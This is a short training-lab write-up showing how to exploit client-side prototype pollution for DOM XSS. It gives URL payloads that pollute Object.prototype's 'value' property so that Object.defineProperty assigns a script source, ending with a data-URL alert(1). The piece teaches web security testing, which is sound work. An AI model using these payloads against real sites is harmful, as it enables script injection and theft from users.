# Lab 4

### Objective: Get DOM XSS

Let's test for the source using the usual payload

```
/?__proto__[foo]=bar
```

Verify it in the console

```
Object.prototype.foo
```

![](<../../../.gitbook/assets/image (24).png>)

Okay that worked, now we need to find a gadget, check out the sources file. We have one noticeable block

```js
async function searchLogger() {

    let config = {params: deparam(new URL(location).searchParams.toString()), transport_url: false};
    
    Object.defineProperty(config, 'transport_url', {configurable: false, writable: false});
    
    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
    
    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}
```

So the usual gadget `trasport_url` cannot being used this time because it is defined from the `config` object.

In the next line, we see `Object.defineProperty` method is used to make the `transport_url` property unconfigurable and unwritable. Fortunately, just like the `fetch` API, the method doesn't explicitly define an **optional objects**. In this case, its the `value` property.

We can use the `value` property as our gadget to be polluted and the `script` element as our sink

**Exploit**

We can test our payload first

```
/?__proto__[value]=bar
```

Now, we check if the `script` tag has appeared

<figure><img src="../../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

Nice, that worked. Now we just trigger an alert

```
/?__proto__[value]=data:,alert(1);
```

<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
